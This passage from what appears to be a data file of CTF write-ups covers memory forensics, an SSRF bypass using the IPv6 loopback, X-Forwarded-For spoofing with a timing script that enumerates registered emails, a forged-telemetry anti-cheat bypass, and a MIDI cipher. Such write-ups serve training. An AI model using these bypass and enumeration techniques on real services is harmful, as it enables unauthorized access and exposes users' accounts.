        code: `PacketCapture{1nj3ct_m3_8decaf00}`
      }
    ]
  },
  {
    id: 'packetcapture-memory-echoes',
    slug: 'packetcapture-memory-echoes',
    title: 'PacketCapture CTF - Memory Echoes',
    platform: 'PacketCapture CTF',
    category: 'Memory Forensics',
    difficulty: 'Medium',
    date: 'October 2026',
    readTime: '4 min read',
    os: 'Memory Dump (node7_memdump.raw)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Offline / Volatility & Strings',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Forensics', 'Memory Forensics', 'Strings', 'XOR Decryption', 'Process Analysis', 'Network Sockets'],
    excerpt: 'Analyzing a raw memory dump to identify conflicting suspicious processes, differentiating an authentic command-and-control beacon from a decoy, decoding decimal XOR seeds, and reconstructing memory blocks into the flag.',
    userFlag: 'PacketCapture{VOLATILE_MEMORY}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview'
      },
      {
        type: 'paragraph',
        text: 'The challenge provided a raw memory dump (node7_memdump.raw) taken from a compromised endpoint. Forensic triage required identifying conflicting processes, uncovering configuration artifacts and obfuscated environment memory blocks, and avoiding false leads.'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:    Memory Echoes
Platform: PacketCapture CTF
Category: Forensics / Memory Forensics
Artifact: node7_memdump.raw`
      },
      {
        type: 'heading',
        text: '2. Step 1: Initial Triage & String Analysis'
      },
      {
        type: 'paragraph',
        text: 'We began by extracting readable string artifacts from the raw memory image matching critical configuration, process, and network patterns:'
      },
      {
        type: 'code',
        code: `$ strings -a node7_memdump.raw | grep -E 'CONFIG|MEM_BLOCK|\\[PROC\\]|NETSCAN|CMDLINE'

CONFIG: MEM_XOR_SEED=90

[PROC] PID=7331 NAME=update_helper.exe
CMDLINE: C:\\Windows\\Temp\\update_helper.exe -silent
ENV: MEM_BLOCK_A=...
ENV: MEM_BLOCK_B=...

[PROC] PID=6672 NAME=cirt_agent.exe
CMDLINE: C:\\Users\\node7\\AppData\\Local\\Temp\\cirt_agent.exe --sync
ENV: MEM_BLOCK_A=0a3b39313f2e193b2a2e2f283f210c15
ENV: MEM_BLOCK_B=161b0e13161f05171f1715080327

NETSCAN: PID=6672 REMOTE=185.220.101.7:4444 STATE=ESTABLISHED`
      },
      {
        type: 'paragraph',
        text: 'Two processes immediately raised suspicion:\n• update_helper.exe (PID 7331) executing with -silent from C:\\Windows\\Temp.\n• cirt_agent.exe (PID 6672) executing from a user Temp directory with an established outbound network socket to 185.220.101.7:4444.'
      },
      {
        type: 'paragraph',
        text: 'The challenge hint indicated that only one of the processes was "telling the truth." The authentic encrypted memory blocks are attached to cirt_agent.exe.'
      },
      {
        type: 'heading',
        text: '3. Step 2: Decoding the XOR Seed'
      },
      {
        type: 'paragraph',
        text: 'The triage extracted a configuration parameter: CONFIG: MEM_XOR_SEED=90. Crucially, the seed value is specified in decimal representation (90 decimal = 0x5A in hex). Treating the value literally as 0x90 results in corrupted garbage.'
      },
      {
        type: 'code',
        code: `XOR Seed Conversion:
Decimal: 90
Hex:     0x5A (01011010 in binary)`
      },
      {
        type: 'heading',
        text: '4. Step 3: Decrypting the Memory Blocks'
      },
      {
        type: 'paragraph',
        text: 'We extracted the hex-encoded memory blocks from the environment of cirt_agent.exe (PID 6672):\n• MEM_BLOCK_A: 0a3b39313f2e193b2a2e2f283f210c15\n• MEM_BLOCK_B: 161b0e13161f05171f1715080327'
      },
      {
        type: 'paragraph',
        text: 'Executing a single-byte XOR against both blocks using key 0x5A reveals the clean plaintext segments:'
      },
      {
        type: 'code',
        code: `key = 0x5A

a = bytes.fromhex("0a3b39313f2e193b2a2e2f283f210c15")
b = bytes.fromhex("161b0e13161f05171f1715080327")

part_a = bytes(x ^ key for x in a).decode()
part_b = bytes(x ^ key for x in b).decode()

print("Block A:", part_a)
# Output: PacketCapture{VO

print("Block B:", part_b)
# Output: LATILE_MEMORY}

print("Full Flag:", part_a + part_b)
# Output: PacketCapture{VOLATILE_MEMORY}`
      },
      {
        type: 'heading',
        text: '5. Decoy Analysis & Validation'
      },
      {
        type: 'paragraph',
        text: 'The update_helper.exe process also contained MEM_BLOCK_A and MEM_BLOCK_B artifacts in its environment. However, decrypting them with key 0x5A produced random unprintable bytes, confirming that update_helper.exe was an intentional decoy planted to mislead analysts.'
      },
      {
        type: 'heading',
        text: '6. Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'Concatenating the two decrypted memory chunks yields the complete flag:'
      },
      {
        type: 'code',
        code: `PacketCapture{VOLATILE_MEMORY}`
      }
    ]
  },
  {
    id: 'packetcapture-internal-trouble',
    slug: 'packetcapture-internal-trouble',
    title: 'PacketCapture CTF - Internal Trouble',
    platform: 'PacketCapture CTF',
    category: 'Web Exploitation',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '5 min read',
    os: 'Node.js / Uptime Kuma',
    osLabel: 'INTERNAL SERVICE',
    ip: 'https://internal.challs.packetcapture.xyz',
    ipLabel: 'TARGET SCOPE',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Web Exploitation', 'SSRF', 'IPv6 Bypass', 'Uptime Kuma', 'EXIF Metadata', 'exiftool'],
    excerpt: 'Exploiting a Server-Side Request Forgery (SSRF) vulnerability in an "Is Website Down?" screenshot service, bypassing 127.0.0.1 loopback blacklists with an IPv6 [::1] loopback address to query internal Uptime Kuma (port 3001), and carving the flag from image EXIF metadata.',
    userFlag: 'PacketCapture{y0u_d1dNt_s33_th4T_c0m1ng_fd23bace}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Mission Brief & Overview'
      },
      {
        type: 'paragraph',
        text: '"What used to be the go-to tool to ensure all 3001 systems were running, now falling silent. The deafening silence reveals the troubles beeping within."'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:      Internal Trouble (ACT 02)
Platform:   PacketCapture CTF
Category:   Web Exploitation
Difficulty: Easy (75 Base Pts)
Target:     https://internal.challs.packetcapture.xyz`
      },
      {
        type: 'paragraph',
        text: 'The clues referencing "3001 systems" and "beeping" strongly indicate Uptime Kuma, an open-source self-hosted monitoring tool that operates by default on port 3001. The goal is to reach this internal monitoring service hidden behind the perimeter.'
      },
      {
        type: 'heading',
        text: '2. Reconnaissance & Surface Analysis'
      },
      {
        type: 'paragraph',
        text: 'Upon visiting the application, we encounter an "Is Website Down?" web interface offering URL uptime checks. Reviewing client-side script logic revealed how the validation request operates:'
      },
      {
        type: 'code',
        code: `// Extracted frontend logic:
fetch('/fetch', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ url })
})
.then(res => res.json())
.then(data => {
  const isUp = data.status === 'ok';
  const statusText = isUp ? 'Website is up' : data.msg;
  
  resultEl.innerHTML = \`
    <p class="result-status \${statusClass}">\${statusText}</p>
    \${isUp ? \`<img class="result-image" src="data:image/png;base64,\${data.msg}" alt="Screenshot">\` : ''}
    <a class="result-link" href="\${url}" target="_blank" rel="noopener noreferrer">\${url}</a>
  \`;
});`
      },
      {
        type: 'paragraph',
        text: 'The frontend forwards the user-supplied URL to POST /fetch. The backend renders a headless browser screenshot of the destination and responds with a Base64-encoded image string (data.msg). Providing arbitrary URLs directly to a backend screenshot renderer is a classic vector for Server-Side Request Forgery (SSRF).'
      },
      {
        type: 'heading',
        text: '3. Step 1: Testing SSRF & Filter Detection'
      },
      {
        type: 'paragraph',
        text: 'We probed the backend directly with curl, targeting the internal Uptime Kuma port on the standard localhost loopback (127.0.0.1:3001):'
      },
      {
        type: 'code',
        code: `$ curl -s -X POST 'https://internal.challs.packetcapture.xyz/fetch' \\
  -H 'Content-Type: application/json' \\
  --data '{"url":"http://127.0.0.1:3001"}' | jq .

{
  "status": "error",
  "msg": "Unauthorized."
}`
      },
      {
        type: 'paragraph',
        text: 'The Unauthorized. response indicates the backend WAF specifically matches and rejects the IPv4 loopback address 127.0.0.1 to thwart basic SSRF attempts.'
      },
      {
        type: 'heading',
        text: '4. Step 2: Bypassing the SSRF Filter via IPv6 Loopback'
      },
      {
        type: 'paragraph',
        text: 'WAF rules frequently blacklist 127.0.0.1 and localhost while failing to account for IPv6 loopback notation. We substituted the target with [::1]:'
      },
      {
        type: 'code',
        code: `$ curl -s -X POST 'https://internal.challs.packetcapture.xyz/fetch' \\
  -H 'Content-Type: application/json' \\
  --data '{"url":"http://[::1]:3001"}' | jq .

{
  "status": "ok",
  "msg": "/9j/4QD6RXhpZgAASUkqAAgAAAAHAA4BAgAyAAAAcgAAABIBAwABAAAAAQAAABoBBQABAAAAYgAAABsBBQABAAAAagAAACgBAwABAAAAAgAAABMCAwABAAAAAQAAAGmHBAABAAAApAAAAAAAAABIAAAAAQAAAEgAAAABAAAAUGFja2V0Q2FwdHVyZXt5MHVfZDFkTnRfczMzX3RoNFRfYzBtMW5nX2ZkMjNiYWNlfQAGAACQBwAEAAAAMDIxMAGRBwAEAAAAAQIDAACgBwAEAAAAMDEwMAGgAwABAAAA//8AAAKgBAABAAAAjgAAAAOgBAABAAAAWAAAAAAAAAD/4gHwSUNDX1BST0ZJTEUAAQEAAAHgbGNtcwQgAABtbnRyUkdC..."
}`
      },
      {
        type: 'paragraph',
        text: 'The [::1] IPv6 bypass successfully circumvented the filter, returning status: ok and a Base64-encoded JPEG buffer.'
      },
      {
        type: 'heading',
        text: '5. Step 3: Flag Extraction via EXIF Metadata'
      },
      {
        type: 'paragraph',
        text: 'We decoded the Base64 screenshot payload directly into an image file and examined its EXIF metadata using exiftool:'
      },
      {
        type: 'code',
        code: `# Save and decode the screenshot
$ curl -s -X POST 'https://internal.challs.packetcapture.xyz/fetch' \\
  -H 'Content-Type: application/json' \\
  --data '{"url":"http://[::1]:3001"}' \\
  | jq -r '.msg' | base64 -d > flag.jpg

# Inspect image metadata tags
$ exiftool flag.jpg
...
Comment                         : PacketCapture{y0u_d1dNt_s33_th4T_c0m1ng_fd23bace}
...

# Alternatively via strings:
$ strings flag.jpg | grep -i "PacketCapture{"
PacketCapture{y0u_d1dNt_s33_th4T_c0m1ng_fd23bace}`
      },
      {
        type: 'heading',
        text: '6. Remediation & Best Practices'
      },
      {
        type: 'paragraph',
        text: 'To secure screenshot and URL-fetching services against SSRF:\n• Domain Allowlisting: Strictly enforce an allowlist of permitted external hostnames rather than relying on blacklist filters.\n• Comprehensive IP Filtering: Resolve DNS before dispatching requests and reject all loopback, link-local, and private subnets across both IPv4 (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254) and IPv6 (::1/128, fc00::/7, fe80::/10).\n• Network Segmentation & Egress Control: Isolate headless renderers in a dedicated sandbox network with strict egress firewall rules forbidding access to internal services.'
      },
      {
        type: 'code',
        code: `PacketCapture{y0u_d1dNt_s33_th4T_c0m1ng_fd23bace}`
      }
    ]
  },
  {
    id: 'packetcapture-corrupt-corporate',
    slug: 'packetcapture-corrupt-corporate',
    title: 'PacketCapture CTF - Corrupt Corporate',
    platform: 'PacketCapture CTF',
    category: 'Web / Timing Attack',
    difficulty: 'Hard',
    date: 'October 2026',
    readTime: '8 min read',
    os: 'Web Application / Reverse Proxy',
    osLabel: 'INFRASTRUCTURE',
    ip: 'https://corrupt.challs.packetcapture.xyz',
    ipLabel: 'TARGET SCOPE',
    status: 'Solved',
    tags: ['PacketCapture CTF', 'Web Exploitation', 'Timing Attack', 'Side Channel', 'X-Forwarded-For', 'Rate Limit Bypass', 'Anti-Enumeration', 'Python'],
    excerpt: 'Overcoming deliberate anti-enumeration defenses and IP-gated rate limits in an authentication portal by spoofing trusted X-Forwarded-For headers, developing a paired same-domain timing attack harness to cancel DNS/mail latency confounds, and recovering the registered corporate email.',
    userFlag: 'PcktCptr{n9ca82@4oe6h.org}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Reconnaissance'
      },
      {
        type: 'paragraph',
        text: 'The landing page at GET / presents a static sign-in form. Inspecting the client-side page source reveals the actual authentication endpoint in an inline <script> block:'
      },
      {
        type: 'code',
        code: `fetch('/sign-in', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: emailInput.value })
});`
      },
      {
        type: 'paragraph',
        text: 'Submitting a POST request to / returns 405 Method Not Allowed; the true endpoint is POST /sign-in accepting a JSON body {"email": "..."}.\n\nThe challenge supplied a wordlist of 150 candidate corporate email addresses along with the hint: "An email is what you need to find."'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:      Corrupt Corporate
Platform:   PacketCapture CTF
Category:   Web / Misc
Target:     https://corrupt.challs.packetcapture.xyz`
      },
      {
        type: 'heading',
        text: '2. The Proxy Gate & Rate Limit Bypass'
      },
      {
        type: 'paragraph',
        text: 'Issuing a baseline request to POST /sign-in results in an access rejection:'
      },
      {
        type: 'code',
        code: `{"status":"error","message":"proxy only allows 10.10.10.x addresses."}`
      },
      {
        type: 'paragraph',
        text: 'The backend sits behind a reverse proxy that only permits internal subnet traffic matching 10.10.10.0/24 via the X-Forwarded-For header. Spoofing this header allows access:'
      },
      {
        type: 'code',
        code: `Header: X-Forwarded-For: 10.10.10.1

Response:
{"status":"success","message":"If the email is registered, we have sent an email for a one-time sign-in URL."}`
      },
      {
        type: 'paragraph',
        text: 'However, rapid requests trigger an aggressive per-IP rate limiter (x-ratelimit-limit: 5). Because the limiter is tracked per forwarded IP address, rotating the last octet (X-Forwarded-For: 10.10.10.<n>) across requests completely neutralizes the restriction.'
      },
      {
        type: 'heading',
        text: '3. The Anti-Enumeration Wall'
      },
      {
        type: 'paragraph',
        text: 'Iterating through all 150 candidate email addresses produces completely identical responses:\n• Identical Body: "If the email is registered, we have sent an email for a one-time sign-in URL."\n• Identical Headers: Content-Length: 111 for every candidate\n• Identical Status Code: 200 OK\n\nThe response content and headers were intentionally engineered to eliminate any traditional enumeration oracle.'
      },
      {
        type: 'heading',
        text: '4. The Timing Side-Channel & Paired Same-Domain Control'
      },
      {
        type: 'paragraph',
        text: 'The second hint was 🕐🕐🕐 (three clocks), indicating a timing attack against the authentication workflow.\n\nFor a registered email, the server must generate a one-time sign-in token, store it in the database, and initiate mailer dispatch before returning an HTTP response. For an unregistered address, it short-circuits immediately.'
      },
      {
        type: 'paragraph',
        text: 'The Pitfall of Global Baseline Timing:\nA naïve timing script comparing all addresses against a global baseline failed due to network drift, server load variance, and domain-level DNS/MX routing latencies between different mail providers.'
      },
      {
        type: 'paragraph',
        text: 'The Solution: Paired Same-Domain Control:\nTo eliminate domain-level latency confounds, each candidate email was tested against a synthetic, randomized control address at the exact same domain:'
      },
      {
        type: 'code',
        code: `import time, random, statistics

def median_latency(email, n=3):
    samples = []
    for _ in range(n):
        dt, sc, body = send(email)      # Rotates X-Forwarded-For: 10.10.10.x
        if dt is not None:
            samples.append(dt)
        time.sleep(0.15)
    return statistics.median(samples), samples

for email in emails:
    domain = email.split("@", 1)[1]
    control = f"zz-nouser-{random.randint(100000, 999999)}@{domain}"

    m_self, _  = median_latency(email,   n=3)
    m_ctrl, _  = median_latency(control, n=3)
    delta      = (m_self - m_ctrl) * 1000   # Net delta in milliseconds`
      },
      {
        type: 'heading',
        text: '5. Measurement Results'
      },
      {
        type: 'paragraph',
        text: 'Running the paired same-domain timing differential across all 150 candidates revealed an undeniable 10x timing outlier:'
      },
      {
        type: 'code',
        code: `Candidate Latency Profile:
n9ca82@4oe6h.org:
  • Self Samples:            902ms, 873ms, 884ms (Median: ~884ms)
  • Same-Domain Control:     72ms, 77ms, 83ms    (Median: ~77ms)
  • Net Positive Delta:      +807 ms (10x server processing delay)

All other candidate addresses:
  • Self vs Same-Domain:     ~80ms vs ~80ms      (Delta: ~0ms)`
      },
      {
        type: 'paragraph',
        text: 'Because the same-domain control consistently resolved in ~77ms, the ~807ms delay was exclusively attributable to the local part (n9ca82), proving that the server was actively generating and queuing credentials for this specific registered user.'
      },
      {
        type: 'heading',
        text: '6. Flag Format Resolution & Recovery'
      },
      {
        type: 'paragraph',
        text: 'While the email address n9ca82@4oe6h.org was conclusively verified, initial submissions using standard PacketCapture{...} prefixes were rejected by the scoring platform until an announcement clarified the custom shortened prefix: PcktCptr.'
      },
      {
        type: 'code',
        code: `PcktCptr{n9ca82@4oe6h.org}`
      },
      {
        type: 'heading',
        text: '7. Solve Summary & Key Takeaways'
      },
      {
        type: 'paragraph',
        text: '1. Endpoint Discovery: Always inspect inline scripts rather than assuming the root path is the submission target.\n2. Proxy Spoofing & IP Rotation: Use trusted CIDR ranges in X-Forwarded-For headers to satisfy proxy gates and evade per-IP rate limiters.\n3. Defeating Anti-Enumeration: When responses are byte-for-byte identical, timing side-channels provide the missing oracle.\n4. Paired Statistical Controls: Cancel out external network, DNS, and mail provider jitter by pairing candidate targets with dummy controls on the same domain.'
      },
      {
        type: 'code',
        code: `PcktCptr{n9ca82@4oe6h.org}`
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-health-is-a-social-construct',
    slug: 'pointer-overflow-ctf-2026-health-is-a-social-construct',
    title: 'Pointer Overflow CTF 2026 - Health Is a Social Construct',
    platform: 'Pointer Overflow CTF 2026',
    category: 'Game Hacking',
    difficulty: 'Hard',
    date: 'October 2026',
    readTime: '8 min read',
    os: 'Godot 4.7.1 / Windows Binary',
    osLabel: 'GAME ENGINE',
    ip: 'pointeroverflowctf.com (API)',
    ipLabel: 'TARGET API',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'Game Hacking', 'Reverse Engineering', 'Godot', 'Anti-Cheat Bypass', 'API Reversing', 'GDScript'],
    excerpt: 'Reverse engineering a compiled Godot 4.7.1 executable, modifying boss battle attributes in scene files, analyzing server-side anti-cheat tick validation, and spoofing API telemetry to mint the flag.',
    userFlag: 'POCTF{48.374.3fc8729f2b663196097426d807cf9413.UF2OTXHOUBNSZ7ZEXUURGCPZS4}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Objective'
      },
      {
        type: 'paragraph',
        text: 'Pointer Overflow CTF 2026 (GH002) "Health Is a Social Construct" is a 2D top-down shooter game challenge featuring three rooms. The objective is to defeat a mathematically impossible boss and bypass the server-side anti-cheat to mint the flag.'
      },
      {
        type: 'code',
        code: `Challenge Brief:
"A 2D top-down shooter. Three rooms. The final room's boss has more HP than you'll ever chip through,
and hits harder than you can absorb. It is not intended to be beaten by aim or by patience.

Beat it anyway. The math is stacked against you — so change the math.

Download the game for your OS and the tiny credentials bundle, put them in the same folder, launch.
Your team's credentials auth you in and let the end screen mint your flag."`
      },
      {
        type: 'heading',
        text: '2. Step 1: Initial Reconnaissance & Client Modification'
      },
      {
        type: 'paragraph',
        text: 'The challenge provided a compiled Godot 4.7.1 executable (POCTF2026-GH002.exe) and a credentials bundle (game.token, team.key). The binary was compiled with disable_path_overrides=no, preventing the direct loading of external .pck files via the --main-pack argument.'
      },
      {
        type: 'paragraph',
        text: 'Bypass: Using Godot RE Tools, we extracted the game\'s source code and opened project.godot directly inside the Godot 4.7.1 Editor. This bypassed the binary hardening and granted full access to modify the game client.'
      },
      {
        type: 'heading',
        text: '3. Step 2: Modifying the "Impossible" Boss'
      },
      {
        type: 'paragraph',
        text: 'We navigated to scenes/bigboss.tscn and nerfed the boss\'s attributes directly in the scene:'
      },
      {
        type: 'code',
        code: `Boss Scene Modifications (scenes/bigboss.tscn):
- max_hp:         reduced from 1000 -> 1
- speed:          reduced to 0.0
- attack_damage:  reduced to 0`
      },
      {
        type: 'paragraph',
        text: 'Upon defeating the boss instantly, the game triggered the end-screen API call, but the server rejected it with:\nERROR_SERVER_400_insufficient_play_evidence'
      },
      {
        type: 'heading',
        text: '4. Step 3: Analyzing API & Client Code'
      },
      {
        type: 'paragraph',
        text: 'By inspecting the extracted scripts (auth_check.gd and FlagToken.gd), we mapped the complete authentication and completion flow:'
      },
      {
        type: 'paragraph',
        text: '1. Initialization: GET /api/challenges/48/instance is called on startup, sending game.token and team.key. The server responds with a nonce which is saved to Session.nonce.\n2. Completion: POST /api/challenges/48/complete is called upon boss defeat, passing the nonce in headers and an empty JSON payload {}.'
      },
      {
        type: 'paragraph',
        text: 'Searching for HTTPRequest across the project confirmed that no intermediate telemetry (like room clears) was being emitted by the client. Progress validation was handled entirely server-side.'
      },
      {
        type: 'heading',
        text: '5. Step 4: The Breakthrough: Debugging the Server Response'
      },
      {
        type: 'paragraph',
        text: 'We modified FlagToken.gd to print the raw HTTP response body to the Godot console and introduced a 180-second delay prior to dispatching /complete to rule out basic timer heuristics. The server returned the exact reason for rejection:'
      },
      {
        type: 'code',
        code: `{
  "detail": "not_enough_ticks",
  "error": "insufficient_play_evidence",
  "have": 2,
  "need": 15
}`
      },
      {
        type: 'paragraph',
        text: 'The server was tracking gameplay "ticks". It counted the initial /instance call and the final /complete call (have: 2), but strictly required at least 15 ticks to prove legitimate gameplay.'
      },
      {
        type: 'heading',
        text: '6. Step 5: Reverse Engineering the Anti-Cheat'
      },
      {
        type: 'paragraph',
        text: 'Attempting to spam the /complete endpoint 20 times continuously returned have: 2, confirming /complete only registers once per nonce session. We deduced that the server exposed a dedicated tick ingestion endpoint: /api/challenges/48/tick.'
      },
      {
        type: 'heading',
        text: '7. Step 6: The Final Exploit Script'
      },
      {
        type: 'paragraph',
        text: 'We updated FlagToken.gd to execute the complete exploit sequence:\n1. Send 15 rapid POST requests to https://pointeroverflowctf.com/api/challenges/48/tick.\n   (The server responded with {"error":"bad_body"}, but did not 404 and correctly incremented the internal tick counter).\n2. Dispatch the final POST request to /complete with a spoofed JSON telemetry payload.'
      },
      {
        type: 'code',
        code: `extends Node
class_name FlagToken

const CHALLENGE_ID: int = 48
const API_BASE: String = "https://pointeroverflowctf.com"
const COMPLETE_URL: String = API_BASE + "/api/challenges/%d/complete"
const TICK_URL: String = API_BASE + "/api/challenges/%d/tick"

var _http: HTTPRequest
var _pending_callback: Callable

func _ready() -> void:
	_http = HTTPRequest.new()
	add_child(_http)
	_http.timeout = 10.0
	_http.use_threads = true

func request_marker(callback: Callable) -> void:
	var token: String = Session.game_token
	var team_key: String = Session.team_key
	var nonce = Session.nonce

	if token.is_empty() or team_key.is_empty():
		callback.call("ERROR_MISSING_FILES")
		return

	if nonce == null or str(nonce).strip_edges().is_empty():
		callback.call("ERROR_NO_NONCE")
		return

	_pending_callback = callback
	_spam_ticks_and_complete(token, team_key, str(nonce).strip_edges())

func _spam_ticks_and_complete(token: String, team_key: String, nonce: String) -> void:
	var headers: PackedStringArray = [
		"X-POCTF-GAME-TOKEN: " + token,
		"X-POCTF-TEAM-KEY: " + team_key,
		"X-POCTF-CHALLENGE-NONCE: " + nonce,
		"Content-Type: application/json"
	]

	var tick_url = TICK_URL % CHALLENGE_ID
	print("FlagService: Spamming 15 tick requests to satisfy anti-cheat...")

	# Send 15 ticks to satisfy the server's "need: 15"
	for i in range(15):
		_http.request(tick_url, headers, HTTPClient.METHOD_POST, "{}")
		var res = await _http.request_completed
		var code = res[1]
		var body = res[3].get_string_from_utf8()
		print("Tick ", i+1, " -> Code: ", code, " Body: ", body)
		await get_tree().create_timer(0.1).timeout

	print("FlagService: Ticks sent. Now sending final /complete request...")
	var complete_url = COMPLETE_URL % CHALLENGE_ID

	var final_payload = JSON.stringify({
		"ticks": 15,
		"hp": 50,
		"max_hp": 100,
		"boss_hp": 0,
		"boss_max_hp": 1000,
		"time_taken": 180.0
	})

	_http.request(complete_url, headers, HTTPClient.METHOD_POST, final_payload)
	var final_res = await _http.request_completed
	var final_code = final_res[1]
	var final_body = final_res[3].get_string_from_utf8()

	print("Final complete response: ", final_code, " ", final_body)

	if final_code == 200:
		var parsed = JSON.parse_string(final_body)
		if typeof(parsed) == TYPE_DICTIONARY and (parsed as Dictionary).has("marker"):
			_pending_callback.call(str((parsed as Dictionary)["marker"]))
			return

	_pending_callback.call("ERROR_SERVER_%d" % final_code)`
      },
      {
        type: 'heading',
        text: '8. Recovered Flag & Takeaways'
      },
      {
        type: 'paragraph',
        text: 'By spoofing the heartbeat ticks and submitting verified boss defeat telemetry, the server minted the true flag:'
      },
      {
        type: 'code',
        code: `POCTF{48.374.3fc8729f2b663196097426d807cf9413.UF2OTXHOUBNSZ7ZEXUURGCPZS4}`
      },
      {
        type: 'paragraph',
        text: '• Read error messages closely: Detailed JSON payloads from the server (have: 2, need: 15) reveal backend validation rules.\n• Never trust the client: The anti-cheat expected telemetry from the client; by crafting synthetic ticks, we satisfied the verification mechanism without playing the game.'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-forty-measures-deep',
    slug: 'pointer-overflow-ctf-2026-forty-measures-deep',
    title: 'Pointer Overflow CTF 2026 - Forty Measures Deep',
    platform: 'Pointer Overflow CTF 2026',
    category: 'Cryptography',
    difficulty: '100 pts • Wave 5',
    date: 'October 2026',
    readTime: '6 min read',
    ip: 'Offline / score.mid',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'Cryptography', 'MIDI', 'Audio Forensics', 'Monoalphabetic Substitution', 'Python', 'Known-Plaintext'],
    excerpt: 'Reversing a 57-note MIDI score (score.mid) encoding a musical monoalphabetic substitution cipher, reconstructed via known-plaintext ASCII cribs, dot delimiter frequency analysis, and base32-like digit mapping.',
    userFlag: 'POCTF{74.374.FXOEANPCJP3WNRK4.725GFATAH3PXBZ23AHE55K3FS6}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Artifact'
      },
      {
        type: 'paragraph',
        text: 'We get one file, score.mid (SHA-256 61b197b2…799cee), and a story about a "musical alphabet". The journal that explains the cipher was not provided, so the cipher has to be recovered from the score, the known plaintext POCTF, and the sample flag format:'
      },
      {
        type: 'file',
        src: '/assets/score.mid',
        filename: 'score.mid',
        label: 'Download score.mid (Challenge MIDI Artifact)',
        caption: 'Challenge Audio File: score.mid (SHA-256: 61b197b2...799cee)'
      },
      {
        type: 'code',
        code: `Sample Flag Format:\nPOCTF{94.374.11c72357d8427203.RDDXGZFRDZWQGHKB4WOVVD5PR6}`
      },
      {
        type: 'heading',
        text: '2. Step 1: Verify the File & Inspect the MIDI'
      },
      {
        type: 'code',
        code: `sha256sum score.mid        # matches the hash in the challenge`
      },
      {
        type: 'paragraph',
        text: 'I parsed the MIDI by hand in Python (no libraries) to see every event:'
      },
      {
        type: 'code',
        code: `d = open('score.mid','rb').read()
i = d.find(b'MTrk') + 8
t = 0; notes = []; run = None
while i < len(d):
    dt = 0
    while True:                       # variable-length delta time
        b = d[i]; i += 1; dt = (dt << 7) | (b & 127)
        if b < 128: break
    t += dt
    s = d[i]
    if s == 0xFF:                     # meta event
        ty, l = d[i+1], d[i+2]; print('meta', hex(ty), d[i+3:i+3+l]); i += 3 + l; continue
    if s & 0x80: run = s; i += 1
    st = run
    if st & 0xF0 in (0xC0, 0xD0): i += 1; continue
    a, b = d[i], d[i+1]; i += 2
    if st & 0xF0 == 0x90 and b > 0: notes.append((t, a, b))
print(len(notes), [n[1] for n in notes])`
      },
      {
        type: 'paragraph',
        text: 'Findings:\n• Track name Forty Measures Deep, 4/4 time, 80 bpm, 480 ticks per beat.\n• 57 notes, one per beat, every note held for exactly 480 ticks, velocity always 64.\n• So the only data is the pitch sequence. Timing, velocity and duration carry nothing.'
      },
      {
        type: 'code',
        code: `80 79 67 84 70 64 60 57 63 56 60 57 63 70 88 79 69 65 78 80 67 74 80 56 87 78 82 75 57 63 60 55 58 71 70 65 84 65 72 56 80 88 66 90 55 56 65 72 69 58 58 75 56 70 83 59 91`
      },
      {
        type: 'heading',
        text: '3. Step 2: The Crib — The First Five Notes Are ASCII'
      },
      {
        type: 'paragraph',
        text: '80 79 67 84 70 is P O C T F in ASCII. So the known plaintext is encoded as itself, and letters sit at their ASCII pitch (A = 65 … Z = 90).\n\nEvery pitch lies in 55 … 91, which is exactly 37 values. That points to a 37-symbol alphabet with note = 55 + index.'
      },
      {
        type: 'heading',
        text: "4. Step 3: Dead Ends (So You Don't Repeat Them)"
      },
      {
        type: 'paragraph',
        text: 'I assumed a keyed cipher first (Vigenère-style mod 37), because the challenge says "known plaintext":'
      },
      {
        type: 'code',
        code: `A = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_'
c = [x - 55 for x in notes]
# - repeating key from the 8 digits after POCTF
# - autokey / ciphertext-feedback with lag 5..40, both signs
# - keys from the title, CALLOWAY, LYON, CONSERVATOIRE_DE_LYON`
      },
      {
        type: 'paragraph',
        text: 'None of these produced readable text. The crib actually showed the opposite: the key over POCTF is zero, so there was probably no key at all.'
      },
      {
        type: 'heading',
        text: "5. Step 4: The Breakthrough — Use the Sample Flag's Structure"
      },
      {
        type: 'paragraph',
        text: "The sample is POCTF{ NN . NNN . <16 chars> . <26 chars> }.\n\nCounting that layout gives 6 + 2 + 1 + 3 + 1 + 16 + 1 + 26 + 1 = 57, the same as the number of notes.\n\nThen I looked at where one specific note appears:"
      },
      {
        type: 'code',
        code: `index:  0..4  5  6  7  8  9  10 11 12 ... 29 30\nnote:   POCTF 64 60 57 63 56 60 57 63 ... 63 60`
      },
      {
        type: 'paragraph',
        text: 'Note 63 sits at indices 8, 12 and 29. Those are exactly the three dots in the sample format. Three hits in 57 positions is not chance. This showed that:\n\n• The cipher is a plain monoalphabetic substitution. The same character always gives the same note, and there is no position-dependent key.\n• The sample format really is the layout of the flag.\n\nFrom the layout I could assign more notes:\n• Index 5 is { → note 64.\n• Index 56 is } → note 91.\n• . → note 63.'
      },
      {
        type: 'heading',
        text: '6. Step 5: Recover the Digit Mapping'
      },
      {
        type: 'paragraph',
